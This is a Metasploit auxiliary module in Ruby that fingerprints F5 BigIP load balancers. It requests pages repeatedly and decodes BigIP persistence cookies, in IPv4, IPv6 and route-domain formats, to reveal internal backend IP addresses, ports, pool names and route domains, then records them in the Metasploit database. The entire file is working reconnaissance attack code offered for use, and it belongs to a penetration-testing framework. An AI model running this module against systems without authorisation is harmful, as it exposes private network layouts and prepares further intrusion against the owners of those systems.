##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'F5 BigIP Backend Cookie Disclosure',
      'Description'    => %q{
        This module identifies F5 BigIP load balancers and leaks backend
        information (pool name, backend's IP address and port, routed domain)
        through cookies inserted by the BigIP system.
      },
      'Author'         =>
        [
          'Thanat0s <thanspam[at]trollprod.org>',
          'Oleg Broslavsky <ovbroslavsky[at]gmail.com>',
          'Nikita Oleksov <neoleksov[at]gmail.com>',
          'Denis Kolegov <dnkolegov[at]gmail.com>'
        ],
      'References'     =>
        [
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/6000/900/sol6917.html'],
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/7000/700/sol7784.html?sr=14607726']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to test', '/']),
        OptInt.new('REQUESTS', [true, 'Number of requests to send to disclose back', 10])
      ], self.class)
  end

  def change_endianness(value, size=4)
    conversion = nil

    if size == 4
      conversion = [value].pack("V").unpack("N").first
    elsif size == 2
      conversion = [value].pack("v").unpack("n").first
    end

    conversion
  end

  def cookie_decode(cookie_value)
    if cookie_value =~ /(\d{8,10})\.(\d{1,5})\./
      host = $1.to_i
      port = $2.to_i
      host = change_endianness(host)
      host = Rex::Socket.addr_itoa(host)
      port = change_endianness(port, 2)
    elsif cookie_value.downcase =~ /rd\d+o0{20}f{4}([a-f0-9]{8})o(\d{1,5})/
      host = $1.to_i(16)
      port = $2.to_i
      host = Rex::Socket.addr_itoa(host)
    elsif cookie_value.downcase =~ /vi([a-f0-9]{32})\.(\d{1,5})/
      host = $1.to_i(16)
      port = $2.to_i
      host = Rex::Socket.addr_itoa(host, v6=true)
      port = change_endianness(port, 2)
    elsif cookie_value.downcase =~ /rd\d+o([a-f0-9]{32})o(\d{1,5})/
      host = $1.to_i(16)
      port = $2.to_i
      host = Rex::Socket.addr_itoa(host, v6=true)
    elsif cookie_value =~ /!.{104}/
      host = nil
      port = nil
    end
    host.nil? ? nil : "#{host}:#{port}"
  end

  def get_cookie # request a page and extract a F5 looking cookie.
    cookie = {}
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => @uri
    })

    unless res.nil?
      # Get the SLB session IDs for all cases:
      # 1. IPv4 pool members - "BIGipServerWEB=2263487148.3013.0000",
      # 2. IPv4 pool members in non-default routed domains - "BIGipServerWEB=rd5o00000000000000000000ffffc0000201o80",
      # 3. IPv6 pool members - "BIGipServerWEB=vi20010112000000000000000000000030.20480",
      # 4. IPv6 pool members in non-default route domains - "BIGipServerWEB=rd3o20010112000000000000000000000030o80",
      # 5. Encrypted cookies - "BIGipServerWEB=!dcdlUciYEFlt1QzXtD7QKx22XJx7Uuj2I0dYdFTwJASsJyJySME9/GACjztr7WYJIvHxTSNreeve7foossGzKS3vT9ECJscSg1LAc3rc"

      m = res.get_cookies.match(/([~_\.\-\w\d]+)=(((?:\d+\.){2}\d+)|(rd\d+o0{20}f{4}\w+o\d{1,5})|(vi([a-f0-9]{32})\.(\d{1,5}))|(rd\d+o([a-f0-9]{32})o(\d{1,5}))|(!(.){104}))(?:$|,|;|\s)/)
      cookie[:id] = m.nil? ? nil : m[1]
      cookie[:value] = m.nil? ? nil : m[2]
   end

    cookie
  end

  def run
    unless datastore['REQUESTS'] > 0
      print_error("Please, configure more than 0 REQUESTS")
      return
    end

    back_ends = []
    @uri = normalize_uri(target_uri.path.to_s)
    print_status("#{peer} - Starting request #{@uri}")

    for i in 0...datastore['REQUESTS']
      cookie = get_cookie() # Get the cookie
      # If the cookie is not found, stop process
      if cookie.empty? || cookie[:id].nil?
        print_error("#{peer} - F5 BigIP load balancing cookie not found")
        break
      end

      # Print the cookie name on the first request
      if i == 0
        print_status("#{peer} - F5 BigIP load balancing cookie \"#{cookie[:id]} = #{cookie[:value]}\" found")
        if cookie[:id].start_with?('BIGipServer')
          print_status("#{peer} - Load balancing pool name \"#{cookie[:id].split('BIGipServer')[1]}\" found")
        end
        if cookie[:value].start_with?('rd')
          print_status("#{peer} - Route domain \"#{cookie[:value].split('rd')[1].split('o')[0]}\" found")
        end
        if cookie[:value].start_with?('!')
          print_status("#{peer} - F5 BigIP cookie is probably encrypted")
        end
      end

      back_end = cookie_decode(cookie[:value])
      unless back_end.nil? || back_ends.include?(back_end)
        print_status("#{peer} - Backend #{back_end} found")
        back_ends.push(back_end)
      end
    end

    # Reporting found backends in database
    unless back_ends.empty?
      report_note(
       :host => rhost,
       :type => "f5_load_balancer_backends",
       :data => back_ends
      )
    end

  end
end
